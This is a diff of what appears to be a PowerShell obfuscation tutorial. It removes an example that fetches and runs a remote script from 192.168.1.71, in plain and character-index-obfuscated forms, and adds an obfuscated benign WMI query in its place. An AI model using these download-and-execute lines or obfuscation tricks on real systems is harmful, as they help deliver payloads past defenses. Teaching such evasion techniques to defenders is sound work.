@@ -366,12 +366,14 @@ The above string can be obfuscated using **powershell special characters:** **`*
 <br />
 
 - String command to obfuscate<br />
-`IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
+`powershell.exe Get-WmiObject -Class Win32_ComputerSystem`
 
 - String obfuscated<br />
-`$env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
 
-![powershell obfuscation](http://i.cubeupload.com/CIbrFI.jpg)
+      $call = $env:LOCALAPPDATA[0,23,21,7,7]-Join ''
+      powershell.exe Get-WmiObject -$call Win32_ComputerSystem
+
+![powershell obfuscation](http://i.cubeupload.com/hgBowH.jpg)
 
 ---
 
